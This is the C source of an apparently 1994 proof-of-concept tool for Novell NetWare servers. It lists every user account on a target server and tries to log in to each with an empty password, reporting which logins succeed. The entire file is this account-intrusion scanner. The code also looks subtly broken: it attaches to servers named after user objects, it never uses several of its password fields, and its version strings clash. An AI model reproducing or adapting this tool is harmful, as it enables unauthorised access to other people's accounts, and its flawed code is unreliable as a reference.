/*
OpenNet Novell Netware Universal Attacher program version 0.90
Free Distribution, attribution mandatory, fees optional

Proof of Concept code to attach to server as any free object 
of a certain  type

1994 farm9.com
milliken & morgan
*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <conio.h>
#include <time.h>
#include <assert.h>

#ifndef FAR
   #define FAR far
#endif

#ifdef __cplusplus
extern "C" {
#endif


#include <nwalias.h>
#include <nwserver.h>
#include <nwcalls.h>
#include <nwbindry.h>
#include <nwcaldef.h>
#include <nwconnec.h>
#include <nwmisc.h>

#ifdef __cplusplus
}
#endif

static WORD connHandle;               // global for atexit()
static WORD connHandle2;               // global for atexit()

static char *security_msg[] = {
		"Anyone", "Logged", "Object", "Supervisor", "NWOS"};

static char *otype_msg[] = {
		"Unknown","User","User Group","Print Queue","File Server","Job Server",
		"Gateway","Print Server","Archive Queue","Archive Server","Job Queue",
		"Administration"};
		
void done(void);                      // atexit() routine to drop LAN connections
int getsne(char *string);

int main(int argc, char **argv)
{
   WORD wNWError;                     // error return code
   char szTargetServerName[48];
   char szTargetUserId[48];
   char szTargetUserNewPassword[48];
   char szHelpDeskUserId[48];
   char szHelpDeskPassword[48];
   int iDoneEditing = 0;              // signals to end data entry
   int ch = 'Y';                      // to recover keystrokes
   int iFileTryCount = 0;

	char           searchObjectName[48];
	NWOBJ_TYPE     searchObjectType;
	NWOBJ_ID       objectID;
	char           szTargetObjectName[48];
	NWOBJ_TYPE     objectType;
	NWFLAGS        objectHasProperties;
	NWFLAGS        objectFlag;
	NWFLAGS        objectSecurity;


   // register an atexit() to ensure we disconnect from server
   atexit(done);                                                    
   
   printf("\nAttacher v1.00\n");


// clean up before printing to screen
   memset(szTargetServerName, 0x00, sizeof(szTargetServerName));
   memset(szTargetUserId, 0x00, sizeof(szTargetUserId));
   memset(szTargetUserNewPassword, 0x00, sizeof(szTargetUserNewPassword));
   memset(szHelpDeskUserId, 0x00, sizeof(szHelpDeskUserId));
   memset(szHelpDeskPassword, 0x00, sizeof(szHelpDeskPassword));

   strcpy(szTargetServerName, argv[1]);
    
   // upper case so Netware won't have a cow...
   strupr(szTargetServerName);
   strupr(szHelpDeskPassword);
   strupr(szTargetUserId);
   strupr(szTargetUserNewPassword);


   /* init the NW system */
   if (wNWError = NWCallsInit(NULL, NULL)){
      printf("NWCallsInit: failed");
      exit(1);
   }

   /* recycle connection handle if there, else attach a new one */
    if (wNWError = NWGetConnectionHandle(szTargetServerName, 0, &connHandle, NULL)) { 
    	if (wNWError = NWAttachToFileServer(szTargetServerName, 0, &connHandle)) {
       		printf("NWAttach failed code %x\n", wNWError);
       		exit(1);
       	}
   }
       
   	printf("Checking user object types on server %s...\n", szTargetServerName);
                          
	memset(searchObjectName, 0x00, sizeof(searchObjectName));                          
   	strcpy(searchObjectName, "*");                            
   
   	searchObjectType = OT_USER;
   	memset(objectID, 0xff, sizeof(objectID));
         
   	while (!(wNWError = NWScanObject(connHandle,
						searchObjectName,
						searchObjectType,
						&objectID,
						szTargetObjectName,
						&objectType,
						&objectHasProperties,
						&objectFlag,
						&objectSecurity))) {

				    
   			// get logged in as the ANY object
   			if (wNWError = NWGetConnectionHandle(szTargetObjectName, 0, &connHandle2, NULL)) { 
    			if (wNWError = NWAttachToFileServer(szTargetObjectName, 0, &connHandle2)) {
       				printf("NWAttach failed code object %s\t%x\n", szTargetObjectName, wNWError);       				
       			}       			
   			}    
   			
    		if (!(wNWError = NWLoginToFileServer(connHandle2, szTargetObjectName, objectType, ""))) {
	    		printf("\nObject: %s [%lx] type %04x", szTargetObjectName, objectID, NWWordSwap(objectType));
    	    	printf("\n\tSecurity: <Scan by '%s': Add by '%s'>", security_msg[objectSecurity & 0x0f], security_msg[(objectSecurity & 0xf0) >> 4]);
     			printf("NWLogin succeeded!");                                                                  
      		}                                   
      	
      	 	printf("Stype %04.4X Name %30.30s Type %4.4u Code %04.4X\n", searchObjectType, szTargetObjectName, objectType, wNWError);  
    		memset(szTargetObjectName, 0x00, sizeof(szTargetObjectName));
    } 
    
    
   	printf("Stype %04.4X Name %30.30s Type %4.4u Code %04.4X\n", searchObjectType, szTargetObjectName, objectType, wNWError);  
   
   return(0);
}


void done(void)
{
   
	; 
}


   